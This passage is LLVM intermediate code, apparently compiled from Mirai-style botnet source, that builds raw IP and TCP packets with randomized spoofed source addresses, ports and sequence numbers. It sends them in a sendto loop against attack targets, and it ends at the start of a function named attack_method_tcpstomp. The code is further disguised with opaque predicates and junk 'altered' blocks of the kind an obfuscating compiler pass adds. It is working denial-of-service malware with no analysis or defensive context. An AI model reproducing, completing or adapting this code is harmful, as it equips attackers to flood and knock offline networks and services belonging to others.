  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %26, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 40, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #8
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %13, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #8
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %14, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %15, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %190

; <label>:186:                                    ; preds = %139
  %187 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 4
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %186, %139
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 6
  store i8 6, i8* %192, align 1
  %193 = load i32, i32* %28, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 8
  store i32 %193, i32* %195, align 4
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 9
  store i32 %201, i32* %203, align 4
  %204 = load i16, i16* %16, align 2
  %205 = call zeroext i16 @htons(i16 zeroext %204) #8
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 0
  store i16 %205, i16* %207, align 4
  %208 = load i16, i16* %17, align 2
  %209 = call zeroext i16 @htons(i16 zeroext %208) #8
  %210 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = load i32, i32* %18, align 4
  %213 = trunc i32 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #8
  %215 = zext i16 %214 to i32
  %216 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 2
  store i32 %215, i32* %217, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %220, -241
  %222 = or i16 %221, 80
  store i16 %222, i16* %219, align 4
  %223 = load i8, i8* %20, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %224, 1
  %229 = shl i16 %228, 13
  %230 = and i16 %227, -8193
  %231 = or i16 %230, %229
  store i16 %231, i16* %226, align 4
  %232 = load i8, i8* %21, align 1
  %233 = sext i8 %232 to i16
  %234 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %233, 1
  %238 = shl i16 %237, 12
  %239 = and i16 %236, -4097
  %240 = or i16 %239, %238
  store i16 %240, i16* %235, align 4
  %241 = load i8, i8* %22, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 11
  %248 = and i16 %245, -2049
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %23, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 10
  %257 = and i16 %254, -1025
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8, i8* %24, align 1
  %260 = sext i8 %259 to i16
  %261 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = and i16 %260, 1
  %265 = shl i16 %264, 9
  %266 = and i16 %263, -513
  %267 = or i16 %266, %265
  store i16 %267, i16* %262, align 4
  %268 = load i8, i8* %25, align 1
  %269 = sext i8 %268 to i16
  %270 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = and i16 %269, 1
  %274 = shl i16 %273, 8
  %275 = and i16 %272, -257
  %276 = or i16 %275, %274
  store i16 %276, i16* %271, align 4
  %277 = call i32 @rand_next()
  %278 = and i32 %277, 65535
  %279 = trunc i32 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 5
  store i16 %279, i16* %281, align 2
  %282 = load i8, i8* %22, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %306

; <label>:284:                                    ; preds = %190
  %285 = load i32, i32* @x.27
  %286 = load i32, i32* @y.28
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %284
  %293 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = and i16 %295, -2049
  %297 = or i16 %296, 2048
  store i16 %297, i16* %294, align 4
  %298 = load i32, i32* @x.27
  %299 = load i32, i32* @y.28
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart223, label %originalBB1alteredBB

originalBBpart223:                                ; preds = %originalBB1
  br label %306

; <label>:306:                                    ; preds = %originalBBpart223, %190
  %307 = load i8*, i8** %31, align 8
  %308 = load i32, i32* %26, align 4
  call void @rand_str(i8* %307, i32 %308)
  br label %309

; <label>:309:                                    ; preds = %306
  %310 = load i32, i32* %9, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %9, align 4
  br label %118

; <label>:312:                                    ; preds = %originalBBpart2
  br label %313

; <label>:313:                                    ; preds = %567, %312
  store i32 0, i32* %9, align 4
  br label %314

; <label>:314:                                    ; preds = %564, %313
  %315 = load i32, i32* @x.27
  %316 = load i32, i32* @y.28
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %314
  %323 = load i32, i32* %9, align 4
  %324 = load i8, i8* %5, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %323, %325
  %327 = load i32, i32* @x.27
  %328 = load i32, i32* @y.28
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %326, label %335, label %567

; <label>:335:                                    ; preds = %originalBBpart227
  %336 = load i8**, i8*** %11, align 8
  %337 = load i32, i32* %9, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds i8*, i8** %336, i64 %338
  %340 = load i8*, i8** %339, align 8
  store i8* %340, i8** %32, align 8
  %341 = load i8*, i8** %32, align 8
  %342 = bitcast i8* %341 to %struct.iphdr*
  store %struct.iphdr* %342, %struct.iphdr** %33, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i64 1
  %345 = bitcast %struct.iphdr* %344 to %struct.tcphdr*
  store %struct.tcphdr* %345, %struct.tcphdr** %34, align 8
  %346 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i64 1
  %348 = bitcast %struct.tcphdr* %347 to i8*
  store i8* %348, i8** %35, align 8
  %349 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 2
  %354 = load i8, i8* %353, align 4
  %355 = zext i8 %354 to i32
  %356 = icmp slt i32 %355, 32
  br i1 %356, label %357, label %394

; <label>:357:                                    ; preds = %335
  %358 = load i32, i32* @x.27
  %359 = load i32, i32* @y.28
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %357
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 1
  %371 = load i32, i32* %370, align 4
  %372 = call i32 @ntohl(i32 %371) #8
  %373 = call i32 @rand_next()
  %374 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %377, i32 0, i32 2
  %379 = load i8, i8* %378, align 4
  %380 = zext i8 %379 to i32
  %381 = lshr i32 %373, %380
  %382 = add i32 %372, %381
  %383 = call i32 @htonl(i32 %382) #8
  %384 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  %386 = load i32, i32* @x.27
  %387 = load i32, i32* @y.28
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart251, label %originalBB29alteredBB

originalBBpart251:                                ; preds = %originalBB29
  br label %394

; <label>:394:                                    ; preds = %originalBBpart251, %335
  %395 = load i32, i32* @x.27
  %396 = load i32, i32* @y.28
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %394
  %403 = load i32, i32* %28, align 4
  %404 = icmp eq i32 %403, -1
  %405 = load i32, i32* @x.27
  %406 = load i32, i32* @y.28
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %404, label %413, label %417

; <label>:413:                                    ; preds = %originalBBpart255
  %414 = call i32 @rand_next()
  %415 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 8
  store i32 %414, i32* %416, align 4
  br label %417

; <label>:417:                                    ; preds = %413, %originalBBpart255
  %418 = load i32, i32* @x.27
  %419 = load i32, i32* @y.28
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %417
  %426 = load i16, i16* %13, align 2
  %427 = zext i16 %426 to i32
  %428 = icmp eq i32 %427, 65535
  %429 = load i32, i32* @x.27
  %430 = load i32, i32* @y.28
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %428, label %437, label %443

; <label>:437:                                    ; preds = %originalBBpart259
  %438 = call i32 @rand_next()
  %439 = and i32 %438, 65535
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  br label %443

; <label>:443:                                    ; preds = %437, %originalBBpart259
  %444 = load i32, i32* @x.27
  %445 = load i32, i32* @y.28
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %443
  %452 = load i16, i16* %16, align 2
  %453 = zext i16 %452 to i32
  %454 = icmp eq i32 %453, 65535
  %455 = load i32, i32* @x.27
  %456 = load i32, i32* @y.28
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %454, label %463, label %469

; <label>:463:                                    ; preds = %originalBBpart263
  %464 = call i32 @rand_next()
  %465 = and i32 %464, 65535
  %466 = trunc i32 %465 to i16
  %467 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  store i16 %466, i16* %468, align 4
  br label %469

; <label>:469:                                    ; preds = %463, %originalBBpart263
  %470 = load i16, i16* %17, align 2
  %471 = zext i16 %470 to i32
  %472 = icmp eq i32 %471, 65535
  br i1 %472, label %473, label %479

; <label>:473:                                    ; preds = %469
  %474 = call i32 @rand_next()
  %475 = and i32 %474, 65535
  %476 = trunc i32 %475 to i16
  %477 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %478 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %477, i32 0, i32 1
  store i16 %476, i16* %478, align 2
  br label %479

; <label>:479:                                    ; preds = %473, %469
  %480 = load i32, i32* @x.27
  %481 = load i32, i32* @y.28
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %479
  %488 = load i32, i32* %18, align 4
  %489 = icmp eq i32 %488, 65535
  %490 = load i32, i32* @x.27
  %491 = load i32, i32* @y.28
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %489, label %498, label %502

; <label>:498:                                    ; preds = %originalBBpart267
  %499 = call i32 @rand_next()
  %500 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 2
  store i32 %499, i32* %501, align 4
  br label %502

; <label>:502:                                    ; preds = %498, %originalBBpart267
  %503 = load i32, i32* %19, align 4
  %504 = icmp eq i32 %503, 65535
  br i1 %504, label %505, label %509

; <label>:505:                                    ; preds = %502
  %506 = call i32 @rand_next()
  %507 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 3
  store i32 %506, i32* %508, align 4
  br label %509

; <label>:509:                                    ; preds = %505, %502
  %510 = load i8, i8* %27, align 1
  %511 = icmp ne i8 %510, 0
  br i1 %511, label %512, label %515

; <label>:512:                                    ; preds = %509
  %513 = load i8*, i8** %35, align 8
  %514 = load i32, i32* %26, align 4
  call void @rand_str(i8* %513, i32 %514)
  br label %515

; <label>:515:                                    ; preds = %512, %509
  %516 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 7
  store i16 0, i16* %517, align 2
  %518 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %519 = bitcast %struct.iphdr* %518 to i16*
  %520 = call zeroext i16 @checksum_generic(i16* %519, i32 20)
  %521 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 7
  store i16 %520, i16* %522, align 2
  %523 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 6
  store i16 0, i16* %524, align 4
  %525 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %526 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %527 = bitcast %struct.tcphdr* %526 to i8*
  %528 = load i32, i32* %26, align 4
  %529 = sext i32 %528 to i64
  %530 = add i64 20, %529
  %531 = trunc i64 %530 to i16
  %532 = call zeroext i16 @htons(i16 zeroext %531) #8
  %533 = load i32, i32* %26, align 4
  %534 = sext i32 %533 to i64
  %535 = add i64 20, %534
  %536 = trunc i64 %535 to i32
  %537 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %525, i8* %527, i16 zeroext %532, i32 %536)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 6
  store i16 %537, i16* %539, align 4
  %540 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 1
  %542 = load i16, i16* %541, align 2
  %543 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %544 = load i32, i32* %9, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %547, i32 0, i32 1
  store i16 %542, i16* %548, align 2
  %549 = load i32, i32* %10, align 4
  %550 = load i8*, i8** %32, align 8
  %551 = load i32, i32* %26, align 4
  %552 = sext i32 %551 to i64
  %553 = add i64 40, %552
  %554 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %555 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %556 = load i32, i32* %9, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i64 %557
  %559 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %558, i32 0, i32 0
  %560 = bitcast %struct.sockaddr_in* %559 to %struct.sockaddr*
  store %struct.sockaddr* %560, %struct.sockaddr** %554, align 8
  %561 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %562 = load %struct.sockaddr*, %struct.sockaddr** %561, align 8
  %563 = call i64 @sendto(i32 %549, i8* %550, i64 %553, i32 16384, %struct.sockaddr* %562, i32 16)
  br label %564

; <label>:564:                                    ; preds = %515
  %565 = load i32, i32* %9, align 4
  %566 = add nsw i32 %565, 1
  store i32 %566, i32* %9, align 4
  br label %314

; <label>:567:                                    ; preds = %originalBBpart227
  br label %313

; <label>:568:                                    ; preds = %114, %108
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %118
  %569 = load i32, i32* %9, align 4
  %570 = load i8, i8* %5, align 1
  %571 = zext i8 %570 to i32
  %572 = icmp slt i32 %569, %571
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %284
  %573 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %574 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %573, i32 0, i32 4
  %575 = load i16, i16* %574, align 4
  %_ = shl i16 %575, -2049
  %_2 = sub i16 %575, -2049
  %gen = mul i16 %_2, -2049
  %_3 = sub i16 0, %575
  %gen4 = add i16 %_3, -2049
  %_5 = shl i16 %575, -2049
  %_6 = sub i16 %575, -2049
  %gen7 = mul i16 %_6, -2049
  %_8 = shl i16 %575, -2049
  %_9 = sub i16 %575, -2049
  %gen10 = mul i16 %_9, -2049
  %576 = and i16 %575, -2049
  %_11 = sub i16 0, %576
  %gen12 = add i16 %_11, 2048
  %_13 = sub i16 0, %576
  %gen14 = add i16 %_13, 2048
  %_15 = shl i16 %576, 2048
  %_16 = sub i16 0, %576
  %gen17 = add i16 %_16, 2048
  %_18 = sub i16 %576, 2048
  %gen19 = mul i16 %_18, 2048
  %_20 = sub i16 %576, 2048
  %gen21 = mul i16 %_20, 2048
  %577 = or i16 %576, 2048
  store i16 %577, i16* %574, align 4
  br label %originalBB1

originalBB25alteredBB:                            ; preds = %originalBB25, %314
  %578 = load i32, i32* %9, align 4
  %579 = load i8, i8* %5, align 1
  %580 = zext i8 %579 to i32
  %581 = icmp slt i32 %578, %580
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %357
  %582 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %583 = load i32, i32* %9, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 1
  %587 = load i32, i32* %586, align 4
  %588 = call i32 @ntohl(i32 %587) #8
  %589 = call i32 @rand_next()
  %590 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %591 = load i32, i32* %9, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i64 %592
  %594 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %593, i32 0, i32 2
  %595 = load i8, i8* %594, align 4
  %596 = zext i8 %595 to i32
  %_30 = sub i32 %589, %596
  %gen31 = mul i32 %_30, %596
  %_32 = sub i32 0, %589
  %gen33 = add i32 %_32, %596
  %_34 = shl i32 %589, %596
  %_35 = sub i32 %589, %596
  %gen36 = mul i32 %_35, %596
  %_37 = sub i32 %589, %596
  %gen38 = mul i32 %_37, %596
  %_39 = sub i32 %589, %596
  %gen40 = mul i32 %_39, %596
  %597 = lshr i32 %589, %596
  %_41 = sub i32 %588, %597
  %gen42 = mul i32 %_41, %597
  %_43 = sub i32 0, %588
  %gen44 = add i32 %_43, %597
  %_45 = sub i32 %588, %597
  %gen46 = mul i32 %_45, %597
  %_47 = shl i32 %588, %597
  %_48 = sub i32 %588, %597
  %gen49 = mul i32 %_48, %597
  %598 = add i32 %588, %597
  %599 = call i32 @htonl(i32 %598) #8
  %600 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i32 0, i32 9
  store i32 %599, i32* %601, align 4
  br label %originalBB29

originalBB53alteredBB:                            ; preds = %originalBB53, %394
  %602 = load i32, i32* %28, align 4
  %603 = icmp eq i32 %602, -1
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %417
  %604 = load i16, i16* %13, align 2
  %605 = zext i16 %604 to i32
  %606 = icmp eq i32 %605, 65535
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %443
  %607 = load i16, i16* %16, align 2
  %608 = zext i16 %607 to i32
  %609 = icmp eq i32 %608, 65535
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %479
  %610 = load i32, i32* %18, align 4
  %611 = icmp eq i32 %610, 65535
  br label %originalBB65
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #7
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
